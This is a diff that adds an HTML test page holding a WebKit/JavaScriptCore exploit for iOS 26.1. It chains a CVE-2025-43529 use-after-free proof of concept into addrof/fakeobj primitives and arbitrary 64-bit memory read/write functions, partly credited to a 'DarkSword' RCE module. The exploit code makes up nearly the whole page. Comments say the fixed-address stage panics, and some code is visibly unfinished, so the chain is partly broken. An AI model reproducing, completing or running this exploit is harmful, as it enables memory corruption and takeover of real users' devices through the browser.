@@ -1,0 +1,271 @@
+<html>
+
+<head>
+    <title>TestingBench</title>
+    <script>
+        //https://github.com/ghh-jb/DarkSword/blob/main/rce_module.js#L2764
+        BigInt.fromDouble = function (v) { f64[0] = v; return u64[0]; };
+        BigInt.fromBytes = function (bytes) { for (let i = 0; i < 8; ++i) { u8[i] = bytes[i]; } return u64[0]; };
+        BigInt.prototype.hex = function () { let s = '0x' + this.toString(16); return s; };
+        BigInt.prototype.asDouble = function () { u64[0] = this; return f64[0]; };
+        BigInt.prototype.add = function (other) { return this + other; };
+        BigInt.prototype.sub = function (other) { return this - other; }
+        BigInt.prototype.noPAC = function () { return this & 0x7fffffffffn; }
+        BigInt.prototype.asInt32s = function () {
+            u64[0] = this;
+            let lo = u32[0];
+            let hi = u32[1];
+            if (hi >= 0x80000000) {
+                hi = (hi - 0x100000000) & 0xffffffff;
+            }
+            if (lo >= 0x80000000) {
+                lo = (lo - 0x100000000) & 0xffffffff;
+            }
+            return [lo, hi];
+        };
+        [].shift();
+/* 
+    </script>
+</head>
+<div id="output-list">
+    <!-- Output log for the script -->
+</div>
+<script>
+    <!-- General UI script -->
+    function log(output) {
+        const addline = document.createElement("p");
+        addline.textContent = output;
+        document.getElementById("output-list").appendChild(addline);
+    }
+</script>
+
+<script>
+    function init() {
+        log("Stage 1")
+
+        //cve-2025-43529 jir4vv1t POC
+        arr = new Array(0x40_0000).fill(1.1);
+        let arr_index = arr.length - 1;
+        let reclaimed = [];
+
+        function foo(flag, k, allocCount) {
+            let A = {
+                p0: 0x41414141,
+                p1: 1.1,
+                p2: 2.2,
+            };
+            arr[arr_index] = A;
+
+            let forGC = [];
+
+            let a = new Date(1111);
+            a[0] = 1.1;
+
+            for (let j = 0; j < allocCount; ++j) {
+                let arr = new ArrayBuffer(0x80_0000);
+                forGC.push(arr);
+            }
+
+            A.p2 = forGC;
+            let b = {
+                p0: 0x42424242,
+                p1: 1.1,
+            };
+
+            let f;
+            f = b;
+            if (flag) {
+                f = 1.1;
+            }
+
+            A.p1 = f;
+            let v = 1.1;
+            for (let i = 0; i < 1e6; ++i) {
+                for (let j = 0; j < k; ++j) {
+                    v = i;
+                    v = j;
+                }
+            }
+            b.p0 = v;
+            b.p1 = a;
+        }
+
+        function recursive(n) {
+            if (n === 0)
+                return;
+            n = n | 0;
+            recursive(n - 1);
+        }
+
+        foo(true, 1, 1);
+        foo(false, 1, 1);
+
+        for (let i = 0; i < 1000; ++i) {
+            foo(false, 0, 0);
+        }
+
+        for (let i = 0; i < 10000; i++)
+            recursive(i);
+
+
+        for (let k = 0; k < 10000; ++k) {
+            foo(false, 10, k % 5 + 1);
+            recursive(10000);
+
+            for (let i = 0; i < 3; ++i) {
+                new ArrayBuffer(0x4000);
+            }
+
+            let freed = arr[arr_index].p1.p1;
+            let noCow = 13.37;
+            let win = false;
+            for (let i = 0; i < 16; ++i) {
+                let arr = [13.37, 2.2, 3.3, 4.4, noCow];
+                reclaimed.push(arr);
+                if (freed[0] === 13.37) {
+                    win = true;
+                    log("UAF ☑️: " + freed[0]);
+                    break;
+                }
+            }
+
+            if (!win) {
+                continue;
+            }
+
+            let boxed_arr = reclaimed[reclaimed.length - 1];
+            boxed_arr[0] = boxed_arr;
+            let unboxed_arr = freed;
+            let ab = new ArrayBuffer(8);
+            let u64 = new BigUint64Array(ab);
+            let f64 = new Float64Array(ab);
+
+            log(" ☑️:" + ftoi(unboxed_arr[0]))
+            function itof(value) {
+                u64[0] = value;
+                return f64[0];
+            }
+
+            function ftoi(f) {
+                f64[0] = f;
+                return u64[0];
+            }
+
+            function addrof(obj) {
+                boxed_arr[0] = obj;
+                return ftoi(unboxed_arr[0]);
+            }
+
+            function fakeobj(addr) {
+                unboxed_arr[0] = itof(addr);
+                log(boxed_arr[0]);
+                return boxed_arr[0];
+            }
+
+            log(fakeobj(addrof(unboxed_arr[0])));
+
+
+            //var location = addrof(unboxed_arr[0]) + 0x10;
+
+            log("Stage 2");
+
+            //taken from darksword https://github.com/ghh-jb/DarkSword/blob/main/rce_module.js#L2764
+            let junk0 = new Array(4).fill(1.1);
+            junk0[0] = 1.1;
+            log(junk0);
+            junk0[1] = 1.1;
+            let scribble_element = new Array(4).fill(1.1);
+            scribble_element[0] = 1.1;
+            scribble_element[1] = 1.1;
+            let results = new Array(2).fill(1.1);
+            results[0] = 1.1;
+            results[1] = 1.1;
+            log("☑️ Scribble setup")
+            //it always panics here after fetching p1 memory addr
+            //fixed address test  //0x00000000b8cd7c46n repro
+            let change_scribble_holder = { p1: fakeobj(0x00000000b8cd7c46n), p2: scribble_element };
+            //addrof test
+            // let change_scribble_holder = { p1: fakeobj(addrof(unboxed_arr[0] + 0x10n)), p2: scribble_element };
+            log("??");
+            log(change_scribble_holder.p1);
+            let change_scribble = fakeobj(addrof(change_scribble_holder) + 0x10n);
+            for (let i = 0; i < 2; i++) {
+                let a = i == 0 ? change_scribble : junk0;
+                results[i] = a[0];
+            }
+            change_scribble_holder.p1 = results[0]; //now we have a valid structureID
+            Log(results[0]);
+
+            scribble_element.p3 = 1.1;
+            scribble_element[0] = 1.1;
+
+            let double_array_cell = BigInt.fromDouble(change_scribble[0]);
+            change_scribble_holder.p1 = fakeobj(double_array_cell);
+            const original_cell = change_scribble[0];
+            log(double_array_cell);
+            log(original_cell);
+            function write64(addr, value) {
+                change_scribble[0] = original_cell;
+                change_scribble[1] = (addr + 0x10n).asDouble();
+
+                if (value === 0n) {
+                    scribble_element.p3 = 1;
+                    delete scribble_element.p3;
+                } else if (value < 0x2000000000000n) {
+                    scribble_element.p3 = fakeobj(value);
+                } else if (value <= 0x7ff2000000000000n || value >= 0x8002000000000000n && value <= 0xfff0000000000000n) {
+                    scribble_element.p3 = value.sub(0x2000000000000n).asDouble();
+                } else {
+                    let off_addr = addr.add(8n);
+                    let off_val = read64(off_addr);
+                    let [hi, lo] = value.asInt32s();
+
+                    scribble_element.p3 = hi;
+                    change_scribble[1] = (addr + 0x14n).asDouble();
+                    scribble_element.p3 = lo;
+
+                    write64(off_addr, off_val);
+                }
+            }
+
+            let read64_biguint64arr = new BigUint64Array(4);
+            change_scribble[1] = addrof(read64_biguint64arr).add(8n).asDouble();
+            let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
+            read64_biguint64arr[0] = 0x2000000000000n;
+            read64_biguint64arr[1] = read64_float64arr_bytes.add(0x10n);
+            let read64_str = '\u5555'.repeat(0x10);
+            [][read64_str];
+            change_scribble[1] = addrof(read64_str).add(8n).asDouble();
+            scribble_element[0] = read64_float64arr_bytes.asDouble();
+
+            function read64(addr) {
+                read64_biguint64arr[1] = addr;
+                return (BigInt(read64_str.charCodeAt(0))
+                    | BigInt(read64_str.charCodeAt(1)) << 16n
+                    | BigInt(read64_str.charCodeAt(2)) << 32n
+                    | BigInt(read64_str.charCodeAt(3)) << 48n);
+            }
+
+            log("??");
+            log(read64(0x00000000b8cd7c40));
+            log(write64(0xfff0000000000777n, 1));
+            alert('end');
+
+            function read32(addr) {
+                read64_biguint64arr[1] = addr;
+
+                return (BigInt(read64_str.charCodeAt(0))
+                    | BigInt(read64_str.charCodeAt(1)) << 16n);
+            }
+        }
+    }
+    document.addEventListener("DOMContentLoaded", () => {
+        //used for testing if you want to run something on page load 
+    });
+</script>
+<p>
+    only confirmed working on iOS 26.1; will cause the page to crash; and call the memory addr. If it's a valid addr you
+    will get kern protection error in analytics, otherwise you will get invalid address.
+</p>
+
+<button id="runner" onclick="init();">Run</button>
